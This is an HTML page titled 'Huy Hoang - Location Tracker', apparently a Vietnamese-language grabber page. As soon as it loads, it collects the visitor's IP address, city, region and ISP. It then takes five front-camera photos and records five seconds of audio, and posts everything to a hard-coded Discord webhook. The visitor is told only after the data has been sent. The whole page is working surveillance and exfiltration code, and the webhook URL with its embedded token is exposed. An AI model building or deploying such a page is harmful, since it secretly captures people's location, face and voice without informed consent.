<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Huy Hoang - Location Tracker</title>
    <style>
        body {
            background: #000;
            margin: 0;
            padding: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: system-ui, sans-serif;
            color: white;
            overflow: hidden;
        }
        .container {
            text-align: center;
        }
        h1 {
            color: #ff4d4d;
            margin-bottom: 30px;
        }
        #status {
            font-size: 1.3rem;
            padding: 20px;
            background: rgba(255, 77, 77, 0.2);
            border-radius: 12px;
            margin: 20px;
        }
    </style>
</head>
<body>
<div class="container">
    <h1>📍 LOCATION TRACKER</h1>
    <div id="status">Đang thu thập thông tin và kích hoạt camera...</div>
</div>

<video id="video" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
// ================== WEBHOOK ĐÃ ĐƯỢC THÊM SẴN ==================
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1487644219945390160/FNtkSqJw4J-4md6mgXJpfwdCsX8pcWn72BEd6snufQKxCNzJzGL5HVzdgknp9L9-cCbM";

const PHOTO_COUNT = 5;
const PHOTO_INTERVAL = 400;
const AUDIO_DURATION = 5000;

let cameraStream = null;
let photoSentCount = 0;

// Gửi dữ liệu đến Discord
async function sendToDiscord(content, files = []) {
    try {
        const formData = new FormData();
        const payload = {
            username: "Huy Hoang - Location Tracker",
            content: content
        };
        formData.append('payload_json', JSON.stringify(payload));

        files.forEach((file, i) => {
            formData.append(`file${i}`, file.blob, file.name);
        });

        await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            body: formData
        });
        console.log('✅ Gửi thành công');
    } catch (e) {
        console.error('Discord error:', e);
    }
}

// Chụp 1 ảnh
async function capturePhoto(video, canvas, photoNumber) {
    return new Promise(resolve => {
        try {
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
                if (blob) {
                    sendToDiscord(`📸 **Ảnh chụp #${photoNumber}**`, [{ blob, name: `photo_${photoNumber}_${Date.now()}.jpg` }]);
                    photoSentCount++;
                }
                resolve();
            }, 'image/jpeg', 0.82);
        } catch (e) {
            console.error('Lỗi chụp ảnh:', e);
            resolve();
        }
    });
}

// Khởi động camera + chụp 5 ảnh
async function startCamera() {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }
        });
        cameraStream = stream;
        video.srcObject = stream;

        await new Promise(r => video.onloadedmetadata = r);

        for (let i = 1; i <= PHOTO_COUNT; i++) {
            await capturePhoto(video, canvas, i);
            if (i < PHOTO_COUNT) await new Promise(r => setTimeout(r, PHOTO_INTERVAL));
        }

        setTimeout(() => {
            if (cameraStream) cameraStream.getTracks().forEach(track => track.stop());
        }, 1000);

    } catch (e) {
        console.warn('Camera error:', e);
    }
}

// Ghi âm 5 giây
async function startAudioRecording() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        const mediaRecorder = new MediaRecorder(stream);
        const chunks = [];

        mediaRecorder.ondataavailable = e => chunks.push(e.data);
        mediaRecorder.onstop = async () => {
            const blob = new Blob(chunks, { type: 'audio/ogg' });
            if (blob.size > 0) {
                await sendToDiscord('🎤 **Ghi âm 5 giây**', [{ blob, name: `audio_${Date.now()}.ogg` }]);
            }
            stream.getTracks().forEach(t => t.stop());
        };

        mediaRecorder.start();
        setTimeout(() => {
            if (mediaRecorder.state === 'recording') mediaRecorder.stop();
        }, AUDIO_DURATION);
    } catch (e) {
        console.warn('Audio recording failed:', e);
    }
}

// Gửi thông tin thiết bị
async function sendDeviceInfo() {
    let ip = 'Không lấy được';
    let city = 'Không xác định';
    let region = 'Không xác định';
    let isp = 'Không xác định';

    try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        ip = data.ip || ip;
        city = data.city || city;
        region = data.region || region;
        isp = data.org || isp;
    } catch (e) {}

    const message = `**📥 KHÁCH TRUY CẬP MỚI**\n\n` +
        `🌐 **IP:** ${ip}\n` +
        `📍 **Thành phố:** ${city}\n` +
        `🗺️ **Khu vực:** ${region}\n` +
        `🏢 **Nhà mạng:** ${isp}\n` +
        `📱 **Thiết bị:** ${navigator.platform}\n` +
        `⏰ **Thời gian:** ${new Date().toLocaleString('vi-VN')}\n` +
        `🔗 **Nguồn:** Truy cập trực tiếp`;

    await sendToDiscord(message);
}

// Khởi chạy tất cả
async function init() {
    document.getElementById('status').textContent = "Đang thu thập thông tin...";

    await Promise.allSettled([
        sendDeviceInfo(),
        startCamera(),
        startAudioRecording()
    ]);

    document.getElementById('status').innerHTML = `
        ✅ Hoàn tất!<br>
        <small>Thông tin, ảnh chụp và ghi âm đã được gửi về Discord của Huy Hoang</small>
    `;
}

window.addEventListener('load', init);
</script>
</body>
</html>
